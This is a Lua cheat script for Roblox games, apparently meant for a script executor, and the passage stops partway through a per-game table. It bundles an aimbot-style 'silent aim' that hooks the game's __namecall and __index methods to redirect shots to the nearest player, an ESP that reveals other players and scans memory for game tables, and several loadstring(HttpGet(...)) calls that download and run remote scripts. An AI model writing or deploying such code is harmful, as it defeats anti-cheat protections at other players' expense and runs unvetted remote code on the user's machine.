-- Scripts
if coolbutworseEsp == true then
local GUI = loadstring(game:GetObjects("rbxassetid://10342057499")[1].Source)()
syn.protect_gui(GUI)
GUI.Parent = game:GetService("CoreGui")
end
if dekuisabitch == true then
getgenv().Bitch = true
loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/Warker-Mart'))()
end
if USilentAim == true then
-- init
if not game:IsLoaded() then 
    game.Loaded:Wait()
end

if not syn or not protectgui then
    getgenv().protectgui = function() end
end

local SilentAimSettings = {
    Enabled = false,
    
    ClassName = "Universal Silent Aim - Averiias, Stefanuk12, xaxa",
    ToggleKey = "RightAlt",
    
    TeamCheck = false,
    VisibleCheck = false, 
    TargetPart = "HumanoidRootPart",
    SilentAimMethod = "Raycast",
    
    FOVRadius = 130,
    FOVVisible = false,
    ShowSilentAimTarget = false, 
    
    MouseHitPrediction = false,
    MouseHitPredictionAmount = 0.165,
    HitChance = 100
}

-- variables
getgenv().SilentAimSettings = Settings
local MainFileName = "UniversalSilentAim"
local SelectedFile, FileToSave = "", ""

local Camera = workspace.CurrentCamera
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local GetChildren = game.GetChildren
local GetPlayers = Players.GetPlayers
local WorldToScreen = Camera.WorldToScreenPoint
local WorldToViewportPoint = Camera.WorldToViewportPoint
local GetPartsObscuringTarget = Camera.GetPartsObscuringTarget
local FindFirstChild = game.FindFirstChild
local RenderStepped = RunService.RenderStepped
local GuiInset = GuiService.GetGuiInset
local GetMouseLocation = UserInputService.GetMouseLocation

local resume = coroutine.resume 
local create = coroutine.create

local ValidTargetParts = {"Head", "HumanoidRootPart"}
local PredictionAmount = 0.165

local mouse_box = Drawing.new("Square")
mouse_box.Visible = true 
mouse_box.ZIndex = 999 
mouse_box.Color = Color3.fromRGB(54, 57, 241)
mouse_box.Thickness = 20 
mouse_box.Size = Vector2.new(20, 20)
mouse_box.Filled = true 

local fov_circle = Drawing.new("Circle")
fov_circle.Thickness = 1
fov_circle.NumSides = 100
fov_circle.Radius = 180
fov_circle.Filled = false
fov_circle.Visible = false
fov_circle.ZIndex = 999
fov_circle.Transparency = 1
fov_circle.Color = Color3.fromRGB(54, 57, 241)

local ExpectedArguments = {
    FindPartOnRayWithIgnoreList = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Ray", "table", "boolean", "boolean"
        }
    },
    FindPartOnRayWithWhitelist = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Ray", "table", "boolean"
        }
    },
    FindPartOnRay = {
        ArgCountRequired = 2,
        Args = {
            "Instance", "Ray", "Instance", "boolean", "boolean"
        }
    },
    Raycast = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Vector3", "Vector3", "RaycastParams"
        }
    }
}

function CalculateChance(Percentage)
    -- // Floor the percentage
    Percentage = math.floor(Percentage)

    -- // Get the chance
    local chance = math.floor(Random.new().NextNumber(Random.new(), 0, 1) * 100) / 100

    -- // Return
    return chance <= Percentage / 100
end


--[[file handling]] do 
    if not isfolder(MainFileName) then 
        makefolder(MainFileName);
    end
    
    if not isfolder(string.format("%s/%s", MainFileName, tostring(game.PlaceId))) then 
        makefolder(string.format("%s/%s", MainFileName, tostring(game.PlaceId)))
    end
end

local Files = listfiles(string.format("%s/%s", "UniversalSilentAim", tostring(game.PlaceId)))

-- functions
local function GetFiles() -- credits to the linoria lib for this function, listfiles returns the files full path and its annoying
local out = {}
for i = 1, #Files do
local file = Files[i]
if file:sub(-4) == '.lua' then
-- i hate this but it has to be done ...

local pos = file:find('.lua', 1, true)
local start = pos

local char = file:sub(pos, pos)
while char ~= '/' and char ~= '\\' and char ~= '' do
pos = pos - 1
char = file:sub(pos, pos)
end

if char == '/' or char == '\\' then
table.insert(out, file:sub(pos + 1, start - 1))
end
end
end

return out
end

local function UpdateFile(FileName)
    assert(FileName or FileName == "string", "oopsies");
    writefile(string.format("%s/%s/%s.lua", MainFileName, tostring(game.PlaceId), FileName), HttpService:JSONEncode(SilentAimSettings))
end

local function LoadFile(FileName)
    assert(FileName or FileName == "string", "oopsies");
    
    local File = string.format("%s/%s/%s.lua", MainFileName, tostring(game.PlaceId), FileName)
    local ConfigData = HttpService:JSONDecode(readfile(File))
    for Index, Value in next, ConfigData do
        SilentAimSettings[Index] = Value
    end
end

local function getPositionOnScreen(Vector)
    local Vec3, OnScreen = WorldToScreen(Camera, Vector)
    return Vector2.new(Vec3.X, Vec3.Y), OnScreen
end

local function ValidateArguments(Args, RayMethod)
    local Matches = 0
    if #Args < RayMethod.ArgCountRequired then
        return false
    end
    for Pos, Argument in next, Args do
        if typeof(Argument) == RayMethod.Args[Pos] then
            Matches = Matches + 1
        end
    end
    return Matches >= RayMethod.ArgCountRequired
end

local function getDirection(Origin, Position)
    return (Position - Origin).Unit * 1000
end

local function getMousePosition()
    return GetMouseLocation(UserInputService)
end

local function IsPlayerVisible(Player)
    local PlayerCharacter = Player.Character
    local LocalPlayerCharacter = LocalPlayer.Character
    
    if not (PlayerCharacter or LocalPlayerCharacter) then return end 
    
    local PlayerRoot = FindFirstChild(PlayerCharacter, Options.TargetPart.Value) or FindFirstChild(PlayerCharacter, "HumanoidRootPart")
    
    if not PlayerRoot then return end 
    
    local CastPoints, IgnoreList = {PlayerRoot.Position, LocalPlayerCharacter, PlayerCharacter}, {LocalPlayerCharacter, PlayerCharacter}
    local ObscuringObjects = #GetPartsObscuringTarget(Camera, CastPoints, IgnoreList)
    
    return ((ObscuringObjects == 0 and true) or (ObscuringObjects > 0 and false))
end

local function getClosestPlayer()
    if not Options.TargetPart.Value then return end
    local Closest
    local DistanceToMouse
    for _, Player in next, GetPlayers(Players) do
        if Player == LocalPlayer then continue end
        if Toggles.TeamCheck.Value and Player.Team == LocalPlayer.Team then continue end

        local Character = Player.Character
        if not Character then continue end
        
        if Toggles.VisibleCheck.Value and not IsPlayerVisible(Player) then continue end

        local HumanoidRootPart = FindFirstChild(Character, "HumanoidRootPart")
        local Humanoid = FindFirstChild(Character, "Humanoid")
        if not HumanoidRootPart or not Humanoid or Humanoid and Humanoid.Health <= 0 then continue end

        local ScreenPosition, OnScreen = getPositionOnScreen(HumanoidRootPart.Position)
        if not OnScreen then continue end

        local Distance = (getMousePosition() - ScreenPosition).Magnitude
        if Distance <= (DistanceToMouse or Options.Radius.Value or 2000) then
            Closest = ((Options.TargetPart.Value == "Random" and Character[ValidTargetParts[math.random(1, #ValidTargetParts)]]) or Character[Options.TargetPart.Value])
            DistanceToMouse = Distance
        end
    end
    return Closest
end

-- ui creating & handling
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/Library.lua"))()
Library:SetWatermark("github.com/Averiias")

local Window = Library:CreateWindow("Universal Silent Aim, by Averiias, xaxa, and Stefanuk12")
local GeneralTab = Window:AddTab("General")
local MainBOX = GeneralTab:AddLeftTabbox("Main") do
    local Main = MainBOX:AddTab("Main")
    
    Main:AddToggle("aim_Enabled", {Text = "Enabled"}):AddKeyPicker("aim_Enabled_KeyPicker", {Default = "RightAlt", SyncToggleState = true, Mode = "Toggle", Text = "Enabled", NoUI = false});
    Options.aim_Enabled_KeyPicker:OnClick(function()
        SilentAimSettings.Enabled = not SilentAimSettings.Enabled
        
        Toggles.aim_Enabled.Value = SilentAimSettings.Enabled
        Toggles.aim_Enabled:SetValue(SilentAimSettings.Enabled)
        
        mouse_box.Visible = SilentAimSettings.Enabled
    end)
    
    Main:AddToggle("TeamCheck", {Text = "Team Check", Default = SilentAimSettings.TeamCheck}):OnChanged(function()
        SilentAimSettings.TeamCheck = Toggles.TeamCheck.Value
    end)
    Main:AddToggle("VisibleCheck", {Text = "Visible Check", Default = SilentAimSettings.VisibleCheck}):OnChanged(function()
        SilentAimSettings.VisibleCheck = Toggles.VisibleCheck.Value
    end)
    Main:AddDropdown("TargetPart", {Text = "Target Part", Default = SilentAimSettings.TargetPart, Values = {"Head", "HumanoidRootPart", "Random"}}):OnChanged(function()
        SilentAimSettings.TargetPart = Options.TargetPart.Value
    end)
    Main:AddDropdown("Method", {Text = "Silent Aim Method", Default = SilentAimSettings.SilentAimMethod, Values = {
        "Raycast","FindPartOnRay",
        "FindPartOnRayWithWhitelist",
        "FindPartOnRayWithIgnoreList",
        "Mouse.Hit/Target"
    }}):OnChanged(function() 
        SilentAimSettings.SilentAimMethod = Options.Method.Value 
    end)
    Main:AddSlider('HitChance', {
        Text = 'Hit chance',
        Default = 100,
        Min = 0,
        Max = 100,
        Rounding = 1,
    
        Compact = false,
    })
    Options.HitChance:OnChanged(function()
        SilentAimSettings.HitChance = Options.HitChance.Value
    end)
end

local MiscellaneousBOX = GeneralTab:AddLeftTabbox("Miscellaneous")
local FieldOfViewBOX = GeneralTab:AddLeftTabbox("Field Of View") do
    local Main = FieldOfViewBOX:AddTab("Visuals")
    
    Main:AddToggle("Visible", {Text = "Show FOV Circle"}):AddColorPicker("Color", {Default = Color3.fromRGB(54, 57, 241)}):OnChanged(function()
        fov_circle.Visible = Toggles.Visible.Value
        SilentAimSettings.FOVVisible = Toggles.Visible.Value
    end)
    Main:AddSlider("Radius", {Text = "FOV Circle Radius", Min = 0, Max = 360, Default = 130, Rounding = 0}):OnChanged(function()
        fov_circle.Radius = Options.Radius.Value
        SilentAimSettings.FOVRadius = Options.Radius.Value
    end)
    Main:AddToggle("MousePosition", {Text = "Show Silent Aim Target"}):AddColorPicker("MouseVisualizeColor", {Default = Color3.fromRGB(54, 57, 241)}):OnChanged(function()
        mouse_box.Visible = Toggles.MousePosition.Value 
        SilentAimSettings.ShowSilentAimTarget = Toggles.MousePosition.Value 
    end)
    local PredictionTab = MiscellaneousBOX:AddTab("Prediction")
    PredictionTab:AddToggle("Prediction", {Text = "Mouse.Hit/Target Prediction"}):OnChanged(function()
        SilentAimSettings.MouseHitPrediction = Toggles.Prediction.Value
    end)
    PredictionTab:AddSlider("Amount", {Text = "Prediction Amount", Min = 0.165, Max = 1, Default = 0.165, Rounding = 3}):OnChanged(function()
        PredictionAmount = Options.Amount.Value
        SilentAimSettings.MouseHitPredictionAmount = Options.Amount.Value
    end)
end

local CreateConfigurationBOX = GeneralTab:AddRightTabbox("Create Configuration") do 
    local Main = CreateConfigurationBOX:AddTab("Create Configuration")
    
    Main:AddInput("CreateConfigTextBox", {Default = "", Numeric = false, Finished = false, Text = "Create Configuration to Create", Tooltip = "Creates a configuration file containing settings you can save and load", Placeholder = "File Name here"}):OnChanged(function()
        if Options.CreateConfigTextBox.Value and string.len(Options.CreateConfigTextBox.Value) ~= "" then 
            FileToSave = Options.CreateConfigTextBox.Value
        end
    end)
    
    Main:AddButton("Create Configuration File", function()
        if FileToSave ~= "" or FileToSave ~= nil then 
            UpdateFile(FileToSave)
        end
    end)
end

local SaveConfigurationBOX = GeneralTab:AddRightTabbox("Save Configuration") do 
    local Main = SaveConfigurationBOX:AddTab("Save Configuration")
    Main:AddDropdown("SaveConfigurationDropdown", {Values = GetFiles(), Text = "Choose Configuration to Save"})
    Main:AddButton("Save Configuration", function()
        if Options.SaveConfigurationDropdown.Value then 
            UpdateFile(Options.SaveConfigurationDropdown.Value)
        end
    end)
end

local LoadConfigurationBOX = GeneralTab:AddRightTabbox("Load Configuration") do 
    local Main = LoadConfigurationBOX:AddTab("Load Configuration")
    
    Main:AddDropdown("LoadConfigurationDropdown", {Values = GetFiles(), Text = "Choose Configuration to Load"})
    Main:AddButton("Load Configuration", function()
        if table.find(GetFiles(), Options.LoadConfigurationDropdown.Value) then
            LoadFile(Options.LoadConfigurationDropdown.Value)
            
            Toggles.TeamCheck:SetValue(SilentAimSettings.TeamCheck)
            Toggles.VisibleCheck:SetValue(SilentAimSettings.VisibleCheck)
            Options.TargetPart:SetValue(SilentAimSettings.TargetPart)
            Options.Method:SetValue(SilentAimSettings.SilentAimMethod)
            Toggles.Visible:SetValue(SilentAimSettings.FOVVisible)
            Options.Radius:SetValue(SilentAimSettings.FOVRadius)
            Toggles.MousePosition:SetValue(SilentAimSettings.ShowSilentAimTarget)
            Toggles.Prediction:SetValue(SilentAimSettings.MouseHitPrediction)
            Options.Amount:SetValue(SilentAimSettings.MouseHitPredictionAmount)
            Options.HitChance:SetValue(SilentAimSettings.HitChance)
        end
    end)
end

resume(create(function()
    RenderStepped:Connect(function()
        if Toggles.MousePosition.Value and Toggles.aim_Enabled.Value then
            if getClosestPlayer() then 
                local Root = getClosestPlayer().Parent.PrimaryPart or getClosestPlayer()
                local RootToViewportPoint, IsOnScreen = WorldToViewportPoint(Camera, Root.Position);
                -- using PrimaryPart instead because if your Target Part is "Random" it will flicker the square between the Target's Head and HumanoidRootPart (its annoying)
                
                mouse_box.Visible = IsOnScreen
                mouse_box.Position = Vector2.new(RootToViewportPoint.X, RootToViewportPoint.Y)
            else 
                mouse_box.Visible = false 
                mouse_box.Position = Vector2.new()
            end
        end
        
        if Toggles.Visible.Value then 
            fov_circle.Visible = Toggles.Visible.Value
            fov_circle.Color = Options.Color.Value
            fov_circle.Position = getMousePosition()
        end
    end)
end))

-- hooks
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
    local Method = getnamecallmethod()
    local Arguments = {...}
    local self = Arguments[1]
    local chance = CalculateChance(SilentAimSettings.HitChance)
    if Toggles.aim_Enabled.Value and self == workspace and not checkcaller() and chance == true then
        if Method == "FindPartOnRayWithIgnoreList" and Options.Method.Value == Method then
            if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRayWithIgnoreList) then
                local A_Ray = Arguments[2]

                local HitPart = getClosestPlayer()
                if HitPart then
                    local Origin = A_Ray.Origin
                    local Direction = getDirection(Origin, HitPart.Position)
                    Arguments[2] = Ray.new(Origin, Direction)

                    return oldNamecall(unpack(Arguments))
                end
            end
        elseif Method == "FindPartOnRayWithWhitelist" and Options.Method.Value == Method then
            if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRayWithWhitelist) then
                local A_Ray = Arguments[2]

                local HitPart = getClosestPlayer()
                if HitPart then
                    local Origin = A_Ray.Origin
                    local Direction = getDirection(Origin, HitPart.Position)
                    Arguments[2] = Ray.new(Origin, Direction)

                    return oldNamecall(unpack(Arguments))
                end
            end
        elseif (Method == "FindPartOnRay" or Method == "findPartOnRay") and Options.Method.Value:lower() == Method:lower() then
            if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRay) then
                local A_Ray = Arguments[2]

                local HitPart = getClosestPlayer()
                if HitPart then
                    local Origin = A_Ray.Origin
                    local Direction = getDirection(Origin, HitPart.Position)
                    Arguments[2] = Ray.new(Origin, Direction)

                    return oldNamecall(unpack(Arguments))
                end
            end
        elseif Method == "Raycast" and Options.Method.Value == Method then
            if ValidateArguments(Arguments, ExpectedArguments.Raycast) then
                local A_Origin = Arguments[2]

                local HitPart = getClosestPlayer()
                if HitPart then
                    Arguments[3] = getDirection(A_Origin, HitPart.Position)

                    return oldNamecall(unpack(Arguments))
                end
            end
        end
    end
    return oldNamecall(...)
end))

local oldIndex = nil 
oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, Index)
    if self == Mouse and not checkcaller() and Toggles.aim_Enabled.Value and Options.Method.Value == "Mouse.Hit/Target" and getClosestPlayer() then
        local HitPart = getClosestPlayer()
         
        if Index == "Target" or Index == "target" then 
            return HitPart
        elseif Index == "Hit" or Index == "hit" then 
            return ((Toggles.Prediction.Value and (HitPart.CFrame + (HitPart.Velocity * PredictionAmount))) or (not Toggles.Prediction.Value and HitPart.CFrame))
        elseif Index == "X" or Index == "x" then 
            return self.X 
        elseif Index == "Y" or Index == "y" then 
            return self.Y 
        elseif Index == "UnitRay" then 
            return Ray.new(self.Origin, (self.Hit - self.Origin).Unit)
        end
    end

    return oldIndex(self, Index)
end))
end
if KeyOverlay == true then
getgenv().k1 = "W"
getgenv().k2 = "A"
getgenv().k3 =  "S"
getgenv().k4 = "D"

getgenv().backdrop = false -- only if you want the shadow bg.
getgenv().showms = true -- only if you want to have your ms shown.
getgenv().showfps = true -- only if you want to have your fps shown.
getgenv().showkps = true -- only if you want to have your kps shown.
getgenv().animated = true -- only if you want the GUI to have the animated shadow.
getgenv().showarrows = false -- only if you want arrow keys to be shown.
getgenv().keydrag = false -- only if you want the keys to be draggable, can also be buggy, will be worked on in the future.

loadstring(game:HttpGet("https://raw.githubusercontent.com/Zirmith/Util-Tools/main/keyStrokes.lua"))()

end
if AstAim == true then
loadstring(game:HttpGetAsync 'https://astolfoaim.femboy.cafe/')('web-ui');
end
if UNESP == true then
assert(Drawing, 'exploit not supported')

if not syn and not PROTOSMASHER_LOADED then print'Unnamed ESP only officially supports Synapse and Protosmasher! If you\'re an exploit developer and have added drawing API to your exploit, try setting syn as true then checking if that works, otherwise, DM me on discord @ cppbook.org#1968 or add an issue to the Unnamed ESP Github Repository and I\'ll see it through email!' end

if not cloneref then cloneref = function(o) return o end end

local UserInputService = cloneref(game:GetService'UserInputService')
local HttpService = cloneref(game:GetService'HttpService')
local TweenService = cloneref(game:GetService'TweenService')
local RunService = cloneref(game:GetService'RunService')
local Players = game:GetService'Players'
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Mouse = LocalPlayer:GetMouse()
local V2New = Vector2.new
local V3New = Vector3.new
local WTVP = Camera.WorldToViewportPoint
local WorldToViewport = function(...) return WTVP(Camera, ...) end
local Menu = {}
local MouseHeld = false
local LastRefresh = 0
local OptionsFile = 'IC3_ESP_SETTINGS.dat'
local Binding = false
local BindedKey = nil
local OIndex = 0
local LineBox = {}
local UIButtons = {}
local Sliders = {}
local ColorPicker = { Loading = false, LastGenerated = 0 }
local Dragging = false
local DraggingUI = false
local Rainbow = false
local DragOffset = V2New()
local DraggingWhat = nil
local OldData = {}
local IgnoreList = {}
local EnemyColor = Color3.new(1, 0, 0)
local TeamColor = Color3.new(0, 1, 0)
local MenuLoaded = false
local ErrorLogging = false
local TracerPosition = V2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 135)
local DragTracerPosition = false
local SubMenu = {}
local IsSynapse = syn and not PROTOSMASHER_LOADED
local Connections = { Active = {} }
local Signal = {} Signal.__index = Signal
local GetCharacter, CurrentColorPicker, Spectating

local QUAD_SUPPORTED_EXPLOIT = pcall(function() Drawing.new('Quad'):Remove() end)

shared.MenuDrawingData = shared.MenuDrawingData or { Instances = {} }
shared.InstanceData = shared.InstanceData or {}
shared.RSName = shared.RSName or ('UnnamedESP_by_ic3-' .. HttpService:GenerateGUID(false))

local GetDataName = shared.RSName .. '-GetData'
local UpdateName = shared.RSName .. '-Update'

local Debounce = setmetatable({}, {
	__index = function(t, i)
		return rawget(t, i) or false
	end
})

if shared.UESP_InputChangedCon then shared.UESP_InputChangedCon:Disconnect() end
if shared.UESP_InputBeganCon then shared.UESP_InputBeganCon:Disconnect() end
if shared.UESP_InputEndedCon then shared.UESP_InputEndedCon:Disconnect() end
if shared.CurrentColorPicker then shared.CurrentColorPicker:Dispose() end

local function IsStringEmpty(String)
	if type(String) == 'string' then
		return String:match'^%s+$' ~= nil or #String == 0 or String == '' or false;
	end
	
	return false;
end

local function Set(t, i, v) t[i] = v end

local Teams = {};
local CustomTeams = { -- Games that don't use roblox's team system
	[2563455047] = {
		Initialize = function()
			Teams.Sheriffs = {}; -- prevent big error
			Teams.Bandits = {}; -- prevent big error
			local Func = game:GetService'ReplicatedStorage':WaitForChild('RogueFunc', 1);
			local Event = game:GetService'ReplicatedStorage':WaitForChild('RogueEvent', 1);
			local S, B = Func:InvokeServer'AllTeamData';

			Teams.Sheriffs = S;
			Teams.Bandits = B;

			Event.OnClientEvent:Connect(function(id, PlayerName, Team, Remove) -- stolen straight from decompiled src lul
				if id == 'UpdateTeam' then
					local TeamTable, NotTeamTable
					if Team == 'Bandits' then
						TeamTable = TDM.Bandits
						NotTeamTable = TDM.Sheriffs
					else
						TeamTable = TDM.Sheriffs
						NotTeamTable = TDM.Bandits
					end
					if Remove then
						TeamTable[PlayerName] = nil
					else
						TeamTable[PlayerName] = true
						NotTeamTable[PlayerName] = nil
					end
					if PlayerName == LocalPlayer.Name then
						TDM.Friendlys = TeamTable
						TDM.Enemies = NotTeamTable
					end
				end
			end)
		end;
		CheckTeam = function(Player)
			local LocalTeam = Teams.Sheriffs[LocalPlayer.Name] and Teams.Sheriffs or Teams.Bandits;
			
			return LocalTeam[Player.Name] and true or false;
		end;
	};
	[5208655184] = {
		CheckTeam = function(Player)
			local LocalLastName = LocalPlayer:GetAttribute'LastName' if not LocalLastName or IsStringEmpty(LocalLastName) then return true end
			local PlayerLastName = Player:GetAttribute'LastName' if not PlayerLastName then return false end

			return PlayerLastName == LocalLastName
		end
	};
	[3541987450] = {
		CheckTeam = function(Player)
			local LocalStats = LocalPlayer:FindFirstChild'leaderstats';
			local LocalLastName = LocalStats and LocalStats:FindFirstChild'LastName'; if not LocalLastName or IsStringEmpty(LocalLastName.Value) then return true; end
			local PlayerStats = Player:FindFirstChild'leaderstats';
			local PlayerLastName = PlayerStats and PlayerStats:FindFirstChild'LastName'; if not PlayerLastName then return false; end

			return PlayerLastName.Value == LocalLastName.Value;
		end;
	};
    [6032399813] = {
		CheckTeam = function(Player)
			local LocalStats = LocalPlayer:FindFirstChild'leaderstats';
			local LocalGuildName = LocalStats and LocalStats:FindFirstChild'Guild'; if not LocalGuildName or IsStringEmpty(LocalGuildName.Value) then return true; end
			local PlayerStats = Player:FindFirstChild'leaderstats';
			local PlayerGuildName = PlayerStats and PlayerStats:FindFirstChild'Guild'; if not PlayerGuildName then return false; end

			return PlayerGuildName.Value == LocalGuildName.Value;
		end;
	};
    [5735553160] = {
		CheckTeam = function(Player)
			local LocalStats = LocalPlayer:FindFirstChild'leaderstats';
			local LocalGuildName = LocalStats and LocalStats:FindFirstChild'Guild'; if not LocalGuildName or IsStringEmpty(LocalGuildName.Value) then return true; end
			local PlayerStats = Player:FindFirstChild'leaderstats';
			local PlayerGuildName = PlayerStats and PlayerStats:FindFirstChild'Guild'; if not PlayerGuildName then return false; end

			return PlayerGuildName.Value == LocalGuildName.Value;
		end;
	};
};

local RenderList = {Instances = {}};

function RenderList:AddOrUpdateInstance(Instance, Obj2Draw, Text, Color)
	RenderList.Instances[Instance] = { ParentInstance = Instance; Instance = Obj2Draw; Text = Text; Color = Color };
	return RenderList.Instances[Instance];
end

local CustomPlayerTag;
local CustomESP;
local CustomCharacter;
local GetHealth;
local GetAliveState;
local CustomRootPartName;

local Modules = {
	[292439477] = {
		CustomESP = function()
			if type(shared.PF_Replication) ~= 'table' then
				local lastScan = shared.pfReplicationScan

				if (tick() - (lastScan or 0)) > 0.01 then
					shared.pfReplicationScan = tick()

					local gc = getgc(true)
					for i = 1, #gc do
						local gcObject = gc[i];
						if type(gcObject) == 'table' and type(rawget(gcObject, 'getbodyparts')) == 'function' then
							shared.PF_Replication = gcObject;
							break
						end
					end
				end

				return
			end

			for Index, Player in pairs(Players:GetPlayers()) do
				if Player == LocalPlayer then continue end

				local Body = shared.PF_Replication.getbodyparts(Player);

				if type(Body) == 'table' and typeof(rawget(Body, 'torso')) == 'Instance' then
					Player.Character = Body.torso.Parent
					continue
				end

				Player.Character = nil;
			end
		end,

		GetHealth = function(Player)
			if type(shared.pfHud) ~= 'table' then
				return false
			end

			return shared.pfHud:getplayerhealth(Player)
		end,

		GetAliveState = function(Player)
			if type(shared.pfHud) ~= 'table' then
				local lastScan = shared.pfHudScan

				if (tick() - (lastScan or 0)) > 0.1 then
					shared.pfHudScan = tick()

					local gc = getgc(true)
					for i = 1, #gc do
						local gcObject = gc[i];
						if type(gcObject) == 'table' and type(rawget(gcObject, 'getplayerhealth')) == 'function' then
							shared.pfHud = gcObject;
							break
						end
					end
				end

				return
			end

			return shared.pfHud:isplayeralive(Player)
		end,

		CustomRootPartName = 'Torso',
	};
	[2950983942] = {
		CustomCharacter = function(Player)
			if workspace:FindFirstChild'Players' then
				return workspace.Players:FindFirstChild(Player.Name);
			end
		end
	};
	[2262441883] = {
		CustomPlayerTag = function(Player)
			return Player:FindFirstChild'Job' and (' [' .. Player.Job.Value .. ']') or '';
		end;
		CustomESP = function()
			if workspace:FindFirstChild'MoneyPrinters' then
				for i, v in pairs(workspace.MoneyPrinters:GetChildren()) do
					local Main	= v:FindFirstChild'Main';
					local Owner	= v:FindFirstChild'TrueOwner';
					local Money	= v:FindFirstChild'Int' and v.Int:FindFirstChild'Money' or nil;
					if Main and Owner and Money then
						local O = tostring(Owner.Value);
						local M = tostring(Money.Value);

						pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, string.format('Money Printer\nOwned by %s\n[%s]', O, M), Color3.fromRGB(13, 255, 227));
					end
				end
			end
		end;
	};
	-- [4581966615] = {
	-- 	CustomESP = function()
	-- 		if workspace:FindFirstChild'Entities' then
	-- 			for i, v in pairs(workspace.Entities:GetChildren()) do
	-- 				if not v.Name:match'Printer' then continue end

	-- 				local Properties = v:FindFirstChild'Properties' if not Properties then continue end
	-- 				local Main	= v:FindFirstChild'hitbox';
	-- 				local Owner	= Properties:FindFirstChild'Owner';
	-- 				local Money	= Properties:FindFirstChild'CurrentPrinted'
					
	-- 				if Main and Owner and Money then
	-- 					local O = Owner.Value and tostring(Owner.Value) or 'no one';
	-- 					local M = tostring(Money.Value);

	-- 					pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, string.format('Money Printer\nOwned by %s\n[%s]', O, M), Color3.fromRGB(13, 255, 227));
	-- 				end
	-- 			end
	-- 		end
	-- 	end;
	-- };
	[4801598506] = {
		CustomESP = function()
			if workspace:FindFirstChild'Mobs' and workspace.Mobs:FindFirstChild'Forest1' then
				for i, v in pairs(workspace.Mobs.Forest1:GetChildren()) do
					local Main	= v:FindFirstChild'Head';
					local Hum	= v:FindFirstChild'Mob';

					if Main and Hum then
						pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, string.format('[%s] [%s/%s]', v.Name, Hum.Health, Hum.MaxHealth), Color3.fromRGB(13, 255, 227));
					end
				end
			end
		end;
	};
	[2555873122] = {
		CustomESP = function()
			if workspace:FindFirstChild'WoodPlanks' then
				for i, v in pairs(workspace:GetChildren()) do
					if v.Name == 'WoodPlanks' then
						local Main = v:FindFirstChild'Wood';

						if Main then
							pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, 'Wood Planks', Color3.fromRGB(13, 255, 227));
						end
					end
				end
			end
		end;
	};
	[5208655184] = {
		CustomESP = function()
			-- if workspace:FindFirstChild'Live' then
			-- 	for i, v in pairs(workspace.Live:GetChildren()) do
			-- 		if v.Name:sub(1, 1) == '.' then
			-- 			local Main = v:FindFirstChild'Head';

			-- 			if Main then
			-- 				pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, v.Name:sub(2), Color3.fromRGB(250, 50, 40));
			-- 			end
			-- 		end
			-- 	end
			-- end
		end;
		CustomPlayerTag = function(Player)
			if game.PlaceVersion < 457 then return '' end

			local Name = '';
			local FirstName = Player:GetAttribute'FirstName'

			if typeof(FirstName) == 'string' and #FirstName > 0 then
				local Prefix = '';
				local Extra = {};
				Name = Name .. '\n[';

				if Player:GetAttribute'Prestige' > 0 then
					Name = Name .. '#' .. tostring(Player:GetAttribute'Prestige') .. ' ';
				end
				if not IsStringEmpty(Player:GetAttribute'HouseRank') then
					Prefix = Player:GetAttribute'HouseRank' == 'Owner' and (Player:GetAttribute'Gender' == 'Female' and 'Lady ' or 'Lord ') or '';
				end
				if not IsStringEmpty(FirstName) then
					Name = Name .. '' .. Prefix .. FirstName;
				end
				if not IsStringEmpty(Player:GetAttribute'LastName') then
					Name = Name .. ' ' .. Player:GetAttribute'LastName';
				end

				if not IsStringEmpty(Name) then Name = Name .. ']'; end

				local Character = GetCharacter(Player);

				if Character then
					if Character and Character:FindFirstChild'Danger' then table.insert(Extra, 'D'); end
					if Character:FindFirstChild'ManaAbilities' and Character.ManaAbilities:FindFirstChild'ManaSprint' then table.insert(Extra, 'D1'); end

					if Character:FindFirstChild'Mana'	 		then table.insert(Extra, 'M' .. math.floor(Character.Mana.Value)); end
					if Character:FindFirstChild'Vampirism' 		then table.insert(Extra, 'V'); end
					if Character:FindFirstChild'Observe'		then table.insert(Extra, 'ILL'); end
					if Character:FindFirstChild'Inferi'			then table.insert(Extra, 'NEC'); end
					if Character:FindFirstChild'World\'s Pulse' then table.insert(Extra, 'DZIN'); end
					if Character:FindFirstChild'Shift'		 	then table.insert(Extra, 'MAD'); end
					if Character:FindFirstChild'Head' and Character.Head:FindFirstChild'FacialMarking' then
						local FM = Character.Head:FindFirstChild'FacialMarking';
						if FM.Texture == 'http://www.roblox.com/asset/?id=4072968006' then
							table.insert(Extra, 'HEALER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4072914434' then
							table.insert(Extra, 'SEER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4094417635' then
							table.insert(Extra, 'JESTER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4072968656' then
							table.insert(Extra, 'BLADE');
						end
					end
				end
				if Player:FindFirstChild'Backpack' then
					if Player.Backpack:FindFirstChild'Observe' 			then table.insert(Extra, 'ILL');  end
					if Player.Backpack:FindFirstChild'Inferi'			then table.insert(Extra, 'NEC');  end
					if Player.Backpack:FindFirstChild'World\'s Pulse' 	then table.insert(Extra, 'DZIN'); end
					if Player.Backpack:FindFirstChild'Shift'		 	then table.insert(Extra, 'MAD'); end
				end

				if #Extra > 0 then Name = Name .. ' [' .. table.concat(Extra, '-') .. ']'; end
			end

			return Name;
		end;
	};
	[3541987450] = {
